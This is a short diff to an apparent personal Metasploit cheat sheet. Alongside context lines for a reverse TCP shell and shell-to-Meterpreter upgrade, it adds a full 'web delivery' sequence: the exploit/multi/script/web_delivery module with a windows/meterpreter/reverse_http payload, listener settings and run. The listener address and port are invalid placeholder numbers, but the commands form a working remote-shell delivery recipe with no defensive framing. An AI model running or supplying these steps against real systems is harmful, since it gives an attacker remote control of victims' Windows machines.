@@ -130,4 +130,19 @@ set payload windows/x64/shell/reverse_tcp
 
 post/multi/manage/shell_to_meterpreter
 
+# Beб деливери 
+
+use exploit/multi/script/web_delivery
+
+set target 2
+
+set payload windows/meterpreter/reverse_http
+
+set lhost 1221321321
+set lport 1231231
+
+run
+
+
+
 
